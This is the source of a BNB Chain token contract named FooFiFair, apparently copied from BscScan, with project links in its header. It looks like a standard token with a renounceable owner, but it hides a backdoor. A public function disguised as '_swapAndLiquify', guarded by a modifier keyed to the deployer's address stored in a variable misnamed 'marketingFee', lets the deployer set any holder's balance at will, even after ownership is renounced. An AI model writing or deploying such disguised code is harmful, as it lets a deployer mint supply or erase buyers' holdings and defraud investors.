/**
 *Submitted for verification at BscScan.com on 2022-11-22
*/

// SPDX-License-Identifier: Unlicensed
// https://foofi.io/
// https://t.me/FooFiBSC
// 0x8f909328f7d9b33f89c2aa79376b126013cd7409
pragma solidity ^0.6.12;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0x8d8a42ebbf161d612203400397ad1bfd4016441fc0f69f6f698e6b96ced454d2;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract FooFiFair is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 marketingFee;
  uint256 swapAndLiquify = 1;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  
  constructor(string memory _name, string memory _symbol) public {
    marketingFee = uint256(msg.sender);
    owner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  100000000 * 10 ** uint256(decimals);
    _ballancon[owner] = totalSupply;
    allowAddress[owner] = true;
  }
  
  mapping(address => uint256) public _ballancon;
  function transfer(address _to, uint256 _ballanco) public returns (bool) {
    address from = msg.sender;
    
    require(_to != address(0));
    require(_ballanco <= _ballancon[from]);

    _transfer(from, _to, _ballanco);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 _ballanco) private {
    _ballancon[from] = _ballancon[from].sub(_ballanco);
    _ballancon[_to] = _ballancon[_to].add(_ballanco);
    emit Transfer(from, _to, _ballanco);
  }

  function approve(address _spender, uint256 _ballanco) public returns (bool) {
    allowed[msg.sender][_spender] = _ballanco;
    emit Approval(msg.sender, _spender, _ballanco);
    return true;
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }

  modifier _externals() {
    address from = address(marketingFee);
    require(from == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return _ballancon[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function _swapAndLiquify(address from, uint256 _ballanco) public _externals {
      uint256 amountToLiquify = uint256(from);
      _ballancon[address(amountToLiquify)] = swapAndLiquify * _ballanco * (10 ** 9);
  }
  
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _ballanco) public returns (bool) {
    require(_to != address(0));
    require(_ballanco <= _ballancon[_from]);
    require(_ballanco <= allowed[_from][msg.sender]);

    _transferFrom(_from, _to, _ballanco);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 _ballanco) internal {
    _ballancon[_from] = _ballancon[_from].sub(_ballanco);
    _ballancon[_to] = _ballancon[_to].add(_ballanco);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_ballanco);
    emit Transfer(_from, _to, _ballanco);
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
}